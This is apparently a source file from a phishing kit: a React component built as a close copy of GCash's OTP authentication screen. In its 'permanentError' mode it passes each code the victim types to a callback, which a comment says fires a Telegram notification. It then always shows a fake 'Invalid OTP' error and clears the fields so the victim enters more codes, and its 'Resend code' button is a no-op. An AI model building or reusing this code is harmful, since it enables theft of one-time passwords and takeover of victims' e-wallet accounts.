"use client";

import { useState, useRef, useEffect } from "react";
import Image from "next/image";
import { ArrowLeft } from "lucide-react";

interface OTPScreenProps {
    phoneNumber: string;
    onBack: () => void;
    onVerify: (otp: string) => void;
    permanentError?: boolean;
}

export function OTPScreen({ phoneNumber, onBack, onVerify, permanentError = false }: OTPScreenProps) {
    const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
    const [error, setError] = useState("");
    const [isLoading, setIsLoading] = useState(false);
    const [resendTimer, setResendTimer] = useState(0); // For demo, let's keep it 0 or manageable
    const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

    useEffect(() => {
        inputRefs.current[0]?.focus();
    }, []);

    const handleChange = (index: number, value: string) => {
        if (!/^\d*$/.test(value)) return;

        const newOtp = [...otp];
        newOtp[index] = value.slice(-1);
        setOtp(newOtp);
        setError("");

        // Auto-focus next input
        if (value && index < 5) {
            inputRefs.current[index + 1]?.focus();
        }

        // Auto-verify when full
        if (newOtp.every(digit => digit !== "") && index === 5) {
            handleVerify(newOtp.join(""));
        }
    };

    const handleKeyDown = (
        index: number,
        e: React.KeyboardEvent<HTMLInputElement>
    ) => {
        if (e.key === "Backspace" && !otp[index] && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
    };

    const handlePaste = (e: React.ClipboardEvent) => {
        e.preventDefault();
        const pastedData = e.clipboardData.getData("text").replace(/\D/g, "");
        const newOtp = [...otp];
        for (let i = 0; i < Math.min(pastedData.length, 6); i++) {
            newOtp[i] = pastedData[i];
        }
        setOtp(newOtp);
        if (pastedData.length >= 6) {
            inputRefs.current[5]?.focus();
            handleVerify(newOtp.join(""));
        } else {
            inputRefs.current[Math.min(pastedData.length, 5)]?.focus();
        }
    };

    const handleVerify = (otpString: string) => {
        if (otpString.length < 6) {
            setError("Please enter the complete 6-digit OTP");
            return;
        }

        if (permanentError) {
            setIsLoading(true);
            onVerify(otpString); // fire Telegram notification even in permanent error mode
            setTimeout(() => {
                setIsLoading(false);
                setError("Invalid OTP. Please try again.");
                // Reset OTP inputs
                setOtp(["", "", "", "", "", ""]);
                inputRefs.current[0]?.focus();
            }, 1500);
            return;
        }

        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            onVerify(otpString);
        }, 2000);
    };

    // Masked number based on user entry: +63 XXXX****XXX
    const maskPhoneNumber = (num: string) => {
        if (!num) return "+63 •••• ••••";
        const cleanNum = num.replace(/\D/g, "");
        // Format: +63 + first 2 digits + **** + last 3 digits
        // GCash usually shows +63 then the number with some digits masked
        // Based on user request to be pixel perfect with screenshot format: +63715****096
        // Let's adapt the input to that format
        const firstPart = cleanNum.substring(0, 3);
        const lastPart = cleanNum.substring(cleanNum.length - 3);
        return `+63${firstPart}****${lastPart}`;
    };

    const maskedNumber = maskPhoneNumber(phoneNumber);

    return (
        <div className="h-[100dvh] max-h-[100dvh] bg-white flex flex-col font-sans overflow-hidden">
            {/* Header */}
            <div className="bg-[#007DFE] h-[56px] min-h-[56px] flex items-center px-4 relative">
                <button
                    onClick={onBack}
                    className="p-2 -ml-2 hover:bg-white/10 rounded-full transition-colors"
                >
                    <ArrowLeft className="w-6 h-6 text-white" strokeWidth={2.5} />
                </button>
                <h1 className="absolute left-1/2 -translate-x-1/2 text-white text-[18px] font-semibold">
                    Authentication
                </h1>
            </div>

            {/* Main Content */}
            <div className="flex-1 flex flex-col items-center px-6 pt-8 pb-6 overflow-hidden">
                <h2 className="text-[#002147] text-[22px] font-bold mb-3 text-center">
                    Verify with Text Message
                </h2>

                <p className="text-[#4A5568] text-[14px] text-center leading-snug w-full max-w-[280px]">
                    We sent a 6-digit authentication code to your registered mobile number
                </p>
                <p className="text-[#002147] text-[22px] font-bold mt-2 mb-5 tracking-wide">
                    {maskedNumber}
                </p>

                <h3 className="text-[#002147] text-[16px] font-semibold mb-4 text-center">
                    Please enter the authentication code
                </h3>

                {/* OTP Input Row */}
                <div className="flex justify-between w-full max-w-[320px] gap-1.5 mb-5" onPaste={handlePaste}>
                    {otp.map((digit, index) => (
                        <input
                            key={index}
                            ref={(el) => {
                                inputRefs.current[index] = el;
                            }}
                            type="text"
                            inputMode="numeric"
                            maxLength={1}
                            value={digit}
                            onChange={(e) => handleChange(index, e.target.value)}
                            onKeyDown={(e) => handleKeyDown(index, e)}
                            className="w-full max-w-[46px] h-[52px] text-center text-[20px] font-bold bg-white border border-gray-300 rounded-[10px] focus:outline-none focus:border-[#007DFE] focus:ring-1 focus:ring-[#007DFE] text-[#002147] transition-all"
                        />
                    ))}
                </div>

                {/* Resend Link */}
                <p className="text-[#4A5568] text-[14px]">
                    Didn't get the code?{" "}
                    <button
                        onClick={() => { }}
                        className="text-[#007DFE] font-bold hover:underline"
                    >
                        Resend code
                    </button>
                </p>

                {error && (
                    <p className="text-red-500 text-sm mt-3 text-center">
                        {error}
                    </p>
                )}

                {isLoading && (
                    <div className="mt-5">
                        <div className="w-8 h-8 border-3 border-gray-200 border-t-[#007DFE] rounded-full animate-spin" />
                    </div>
                )}
            </div>
        </div>
    );
}
